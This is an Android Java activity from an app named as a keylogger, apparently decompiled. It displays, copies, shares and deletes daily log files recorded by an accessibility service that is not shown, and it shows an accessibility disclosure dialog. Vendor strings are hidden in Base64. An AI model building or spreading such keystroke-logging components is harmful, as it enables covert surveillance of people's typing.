package com.azamovhudstc.androidkeylogger;

import android.annotation.SuppressLint;
import android.app.AlertDialog.Builder;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.util.Base64;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemSelectedListener;
import android.widget.ArrayAdapter;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.nio.charset.StandardCharsets;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private TextView s;
    private Spinner t;
    private String u = "";
    private String v;
    private final List<String> w = new ArrayList<>();
    boolean x = false;

    class a implements OnItemSelectedListener {
        a() {
        }

        public void onItemSelected(AdapterView adapterView, View view, int i, long j) {
            MainActivity mainActivity = MainActivity.this;
            mainActivity.u = mainActivity.w.get(i);
            mainActivity.b0(mainActivity.u);
        }

        public void onNothingSelected(AdapterView adapterView) {
            String str = "";
            MainActivity.this.u = str;
            MainActivity.this.s.setText(str);
        }
    }

    private void T() {
        if (!SvcAcc.i) {
            if (!SvcAcc.j) {
                startActivity(new Intent(this, AccessibilityActivity.class));
            } else if (!this.x) {
                this.x = true;
                Builder builder = new Builder(this);
                builder.setTitle(getString(R.string.disclosure));
                builder.setCancelable(false);
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append(getString(R.string.using_accessibility));
                stringBuilder.append("\n\n");
                stringBuilder.append(getString(R.string.purpose));
                builder.setMessage(stringBuilder.toString());
                builder.setNegativeButton(getString(R.string.cancel), new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        V(dialog, which);
                    }
                });
                builder.setPositiveButton(getString(R.string.accept), new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        V(dialog, which);
                    }
                });
                builder.show();
            }
        }
    }

    private Date U(String str) {
        try {
            return new SimpleDateFormat("yyyyMMdd", Locale.getDefault()).parse(str);
        } catch (Exception unused) {
            return new Date(0);
        }
    }

    private /* synthetic */ void V(DialogInterface dialogInterface, int i) {
        this.x = false;
        dialogInterface.dismiss();
    }

    private /* synthetic */ void W(DialogInterface dialogInterface, int i) {
        this.x = false;
        startActivity(new Intent(this, AccessibilityActivity.class));
    }

    private /* synthetic */ void X(View view) {
        String str = "android.intent.action.VIEW";
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(new String(Base64.decode("aHR0cHM6Ly93d3cuYS1zcHkuY29tLz8=", 0), StandardCharsets.UTF_8));
        stringBuilder.append("TypingLogger");
        String stringBuilder2 = stringBuilder.toString();
        Intent intent;
        try {
            intent = new Intent(str, Uri.parse(stringBuilder2));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception unused) {
            intent = new Intent(str, Uri.parse(stringBuilder2));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(Intent.createChooser(intent, "Browse with"));
        }
    }

    private /* synthetic */ void Y(DialogInterface dialogInterface, int i) {
        if (!this.u.isEmpty()) {
            if (new File(this.v, this.u).delete()) {
                SvcAcc svcAcc = SvcAcc.h;
                if (svcAcc != null && svcAcc.b.equals(this.u)) {
                    SvcAcc.h.a();
                }
                a0();
                return;
            }
            Toast.makeText(this, getString(R.string.not_deleted), Toast.LENGTH_LONG).show();
        }
    }

    @SuppressLint("ResourceType")
    private void a0() {
        String str = "";
        Object obj = this.t.getSelectedItem() != null ? this.w.get(this.t.getSelectedItemPosition()) : str;
        this.w.clear();
        ArrayList<String> arrayList = new ArrayList<>();
        File[] listFiles = new File(this.v).listFiles();
        if (listFiles != null) {
            if (VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(listFiles, Comparator.reverseOrder());
            }
            for (File name : listFiles) {
                String name2 = name.getName();
                Date U = U(name2);
                if (U.getTime() > 0) {
                    this.w.add(name2);
                    arrayList.add(DateFormat.getDateInstance(2).format(U));
                }
            }
        }
        this.t.setAdapter(new ArrayAdapter<>(this, 17367049, arrayList));
        if (this.w.size() > 0) {
            int indexOf = this.w.indexOf(obj);
            if (indexOf < 1) {
                this.u = this.w.get(0);
                indexOf = 0;
            }
            this.t.setSelection(indexOf, false);
        } else {
            this.u = str;
            this.s.setText(str);
        }
        invalidateOptionsMenu();
    }

    private void b0(String str) {
        File file = new File(this.v, str);
        StringBuilder stringBuilder = new StringBuilder();
        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
            while (true) {
                String readLine = bufferedReader.readLine();
                if (readLine == null) {
                    break;
                }
                stringBuilder.append(readLine);
                stringBuilder.append("\n");
            }
            bufferedReader.close();
            SvcAcc svcAcc = SvcAcc.h;
            if (svcAcc != null && svcAcc.b.equals(str)) {
                stringBuilder.append(SvcAcc.h.c());
            }
            this.s.setText(stringBuilder);
        } catch (Exception e) {
            Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    /* Access modifiers changed, original: protected */
    public void onCreate(Bundle bundle) {
        long j;
        super.onCreate(bundle);
        setContentView((int) R.layout.activity_main);
        this.v = getFilesDir().getAbsolutePath();
        this.t = (Spinner) findViewById(R.id.dropdown);
        this.s = (TextView) findViewById(R.id.textview);
        this.t.setOnItemSelectedListener(new a());
        try {
            j = (getPackageManager().getPackageInfo(getPackageName(), 0)).lastUpdateTime;
        } catch (Exception unused) {
            j = Calendar.getInstance().getTimeInMillis() - 300001;
        }
        if (Calendar.getInstance().getTimeInMillis() - j > 600000) {
            findViewById(R.id.belolayout).setOnClickListener(new View.OnClickListener() {
                public final void onClick(View view) {
                    MainActivity.this.X(view);
                }
            });
            ((TextView) findViewById(R.id.adv1)).setText(new String(Base64.decode("VGhpcyBhcHAgaXMgcHJvdmlkZWQgYnk6", 0), StandardCharsets.UTF_8));
            ((TextView) findViewById(R.id.adv2)).setText(new String(Base64.decode("d3d3LmEtc3B5LmNvbQ==", 0), StandardCharsets.UTF_8));
            findViewById(R.id.belolayout).setVisibility(View.VISIBLE);
        }
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.btn, menu);
        return true;
    }

    /* Access modifiers changed, original: protected */
    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onOptionsItemSelected(MenuItem menuItem) {
        int itemId = menuItem.getItemId();
        if (itemId == R.id.action_delete) {
            Builder builder = new Builder(this);
            builder.setMessage(getString(R.string.ask_delete));
            builder.setCancelable(true);
            builder.setPositiveButton(getString(R.string.ok), new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    MainActivity.this.Y(dialog, which);
                }
            });
            builder.setNegativeButton(getString(R.string.cancel), new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    V(dialog, which);
                }
            });
            builder.show();
        } else if (itemId == R.id.action_copy) {
            ClipboardManager clipboardManager = (ClipboardManager) getApplicationContext().getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboardManager != null) {
                try {
                    clipboardManager.setPrimaryClip(ClipData.newPlainText(getString(R.string.content_copied), this.s.getText()));
                } catch (Exception e) {
                    Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
                }
            }
        } else if (itemId == R.id.action_share) {
            Intent intent = new Intent("android.intent.action.SEND");
            intent.setType("text/plain");
            intent.putExtra("android.intent.extra.SUBJECT", getString(R.string.content_shared));
            intent.putExtra("android.intent.extra.TEXT", this.s.getText());
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivity(Intent.createChooser(intent, getString(R.string.share)));
        }
        return super.onOptionsItemSelected(menuItem);
    }

    /* Access modifiers changed, original: protected */
    public void onPause() {
        super.onPause();
    }

    public boolean onPrepareOptionsMenu(Menu menu) {
        menu.clear();
        getMenuInflater().inflate(R.menu.btn, menu);
//        menu.findItem(R.id.action_delete).setVisible(this.u.isEmpty() ^ 1);
//        menu.findItem(R.id.action_copy).setVisible(this.u.isEmpty() ^ 1);
//        menu.findItem(R.id.action_share).setVisible(this.u.isEmpty() ^ 1);
        return super.onPrepareOptionsMenu(menu);
    }

    /* Access modifiers changed, original: protected */
    public void onResume() {
        super.onResume();
        a0();
        T();
    }
}